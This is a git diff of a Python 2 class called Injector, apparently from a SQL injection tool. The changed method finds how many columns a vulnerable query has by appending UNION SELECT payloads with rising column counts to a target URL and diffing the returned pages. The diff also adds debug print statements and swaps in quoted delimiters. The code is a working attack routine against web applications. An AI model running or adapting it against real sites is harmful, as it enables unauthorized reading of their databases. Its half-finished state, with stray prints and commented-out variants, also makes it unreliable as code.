@@ -16,7 +16,6 @@ class Injector:
             :flags: Dict of strings. Keys are flags, values are params.
         """
 
-        page_and_params = page.split('?')
         self.page = page
         self.flags = flags 
         self.offset = 0 # can be changed to say, self.offset, if 1,2,3,4... found on page a lot
@@ -32,16 +31,22 @@ class Injector:
             :returns:   Int. Number of columns in vulnerable statement.
         """
         count = 1
+        print 'here'
     
         original_page = self.scan.page(self.page)
         ### Using UNION SELECT appending 1,2,... ###
-        union = self.page + self.build.union_string + self.build.delimiter + '1'
+        # Need to differentiate between str and int params
+        union = self.page + self.build.union_string + self.build.delimiter + str(count)
+        #union = self.page + self.build.union_string + self.build.delimiter + "'" + str(count)
+        print original_page
+        print union
+        print self.scan.page(union) 
 
         ### Heuristic just looks for SELECT or empty list, needs to be MORE NUANCED!
-
         while len(self.parse.html_diff(original_page, self.scan.page(union))) == 0 or 'SELECT' in self.parse.html_diff(original_page, self.scan.page(union)):
             count += 1
-            union += ',%20' + str(count + self.offset)
+            union += ",'" + str(count + self.offset)
+            #union += "," + str(count + self.offset)
 
         """
         ### Using ORDER BY x--, x = 9,8,... ###
